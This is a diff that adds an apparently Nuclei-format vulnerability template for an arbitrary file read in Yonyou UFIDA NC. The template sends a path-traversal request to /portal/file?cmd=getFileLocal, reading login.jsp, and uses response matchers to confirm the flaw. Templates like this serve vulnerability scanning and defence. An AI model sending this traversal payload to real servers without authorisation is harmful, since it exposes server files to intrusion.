@@ -1,0 +1,19 @@
+id: yonyou-ufida-nc-fileread-getFileLocal
+
+info:
+  name: yonyou-ufida-nc-fileread-getFileLocal
+  author: yonyou-ufida-nc-fileread-getFileLocal
+  severity: medium
+
+http:
+  - raw:
+      - |+
+        GET /portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body, 'WEB-INF/jsp/ncapplet.jsp','WEB-INF/jsp/resolution.jsp') && status_code==200 && contains(header,'attachment; filename')"
